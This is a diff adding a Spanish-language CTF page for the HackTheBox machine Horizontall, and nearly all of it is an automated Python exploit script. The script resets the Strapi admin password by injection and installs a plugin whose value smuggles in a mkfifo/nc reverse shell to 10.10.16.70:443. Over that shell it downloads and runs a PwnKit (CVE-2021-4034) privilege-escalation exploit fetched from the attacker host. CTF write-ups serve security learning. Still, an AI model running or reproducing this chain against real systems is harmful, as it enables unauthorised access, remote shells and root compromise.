@@ -1,6 +1,108 @@
 ---
 layout: content
 ---
+<p> </p>
+
+Este script explota un campo de reseteo de contraseña mal configurado para acceder como usuario admin y subir un plugin malicioso ganando un Shell inverso por `nc`, tambien se aprovecha del permiso `SUID` `pkexec` para escalar privilegios.
+
+<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Horizontall - HackTheBox</h2>
+
+```python
+#!/usr/bin/python3
+#coding: utf-8
+
+from pwn import *
+import sys
+import requests
+import signal
+import subprocess
+import urllib3
+import json
+import zipfile 
+import shutil
+import git
+
+def def_handler(sig,frame):
+	print("Saliendo...")
+	sys.exit(1)
+signal.signal(signal.SIGINT, def_handler)
+
+class Exploit:
+
+	def __init__(self, main_url, password, filename):
+
+		self.url = main_url
+		self.password = password
+		self.filename = filename
+
+	def zip_file(self):
+		os.system('rm -rf CVE-2021-4034 CVE-2021-4034.zip')
+		git.Git('').clone('git://github.com/berdav/CVE-2021-4034.git')
+		cwd = os.getcwd()
+		shutil.make_archive(self.filename, 'zip', cwd+'/'+self.filename)
+
+	def reset_password(self):
+
+		s = requests.session()
+		s.verify = False
+		urllib3.disable_warnings()
+
+		p1 = log.progress('Password')
+
+		data_password = {
+			'code': {'$gt':0},
+			'password': self.password,
+			'passwordConfirmation': self.password
+		}
+
+		r = s.post(self.url+'/admin/auth/reset-password', json=data_password).text
+
+		response = json.loads(r)
+		global jwt
+
+		jwt = response['jwt']
+
+		if 'jwt' not in r:
+			p1.failure('Not changed password')
+			sys.exit(1)
+		else:
+			p1.success(f'[Changed password] username admin and password {self.password}')
+
+	def rce_starpi(self):
+
+		header = { 'Authorization': f'Bearer {jwt}' }
+		
+		# Cambiar IP por la vuestra
+
+		data_plugin = {
+			'plugin': f'documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.70 443 >/tmp/f)',
+			'port': '1337'
+		}
+
+		r = requests.post(self.url+'/admin/plugins/install', json=data_plugin, headers=header)
+
+		print(r.text)
+
+autopwn = Exploit('http://api-prod.horizontall.htb', 'pass', 'CVE-2021-4034')
+
+def main():
+	autopwn.zip_file()
+	autopwn.reset_password()
+	autopwn.rce_starpi()
+	
+	
+
+if __name__ == '__main__':
+	try:
+		threading.Thread(target=main, args=()).start()
+	except Exception as e:
+		log.error(str(e))
+
+shell = listen(443, timeout=20).wait_for_connection()
+# Cambiar IP por la vuestra
+shell.sendline('cd /tmp; wget http://10.10.16.70:8000/CVE-2021-4034.zip > /dev/null 2>&1; unzip -q CVE-2021-4034.zip; make 2>/dev/null; ./cve-2021-4034')
+shell.interactive()
+```
 
 <p> </p>
 
